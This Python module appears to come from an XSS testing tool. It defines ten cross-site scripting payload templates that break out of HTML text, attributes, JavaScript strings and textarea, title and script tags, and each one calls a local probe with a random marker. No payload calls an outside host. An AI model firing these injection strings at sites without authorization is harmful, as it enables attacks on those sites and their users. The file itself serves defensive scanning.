"""Harmless, local execution markers; no external callbacks or data collection."""

from __future__ import annotations

import re
import secrets
from dataclasses import dataclass


@dataclass(frozen=True)
class Payload:
    id: str
    context: str
    template: str

    def render(self, marker: str) -> str:
        if not re.fullmatch(r"[A-Za-z0-9_]{1,128}", marker):
            raise ValueError("Execution markers must be short alphanumeric identifiers")
        return self.template.replace("{marker}", marker)


_SVG = '<svg onload="globalThis.__xss_probe(\'{marker}\')"></svg>'

PAYLOADS: tuple[Payload, ...] = (
    Payload("html_svg", "HTML text", _SVG),
    Payload("html_img", "HTML text", '<img src="data:," onerror="globalThis.__xss_probe(\'{marker}\')">'),
    Payload("attribute_double", "Double-quoted HTML attribute", '">' + _SVG + '<span data-x="'),
    Payload("attribute_single", "Single-quoted HTML attribute", "'>" + _SVG + "<span data-x='"),
    Payload("js_single", "Single-quoted JavaScript string", "';globalThis.__xss_probe('{marker}');//"),
    Payload("js_double", "Double-quoted JavaScript string", '\";globalThis.__xss_probe(\'{marker}\');//'),
    Payload("template_literal", "JavaScript template literal", "${globalThis.__xss_probe('{marker}')}"),
    Payload("textarea_boundary", "Textarea element boundary", "</textarea>" + _SVG),
    Payload("title_boundary", "Title element boundary", "</title>" + _SVG),
    Payload("script_boundary", "Script element boundary", "</script>" + _SVG),
)


def new_marker() -> str:
    return "xss_" + secrets.token_hex(16)


def select_payloads(ids: list[str] | tuple[str, ...] | None = None) -> list[Payload]:
    if ids is None:
        return list(PAYLOADS)
    if not isinstance(ids, (list, tuple)) or not ids:
        raise ValueError("Payload selection must be a nonempty list of payload IDs")
    by_id = {payload.id: payload for payload in PAYLOADS}
    selected: list[Payload] = []
    for payload_id in ids:
        if not isinstance(payload_id, str) or payload_id not in by_id:
            raise ValueError("Unknown payload ID")
        if by_id[payload_id] not in selected:
            selected.append(by_id[payload_id])
    return selected
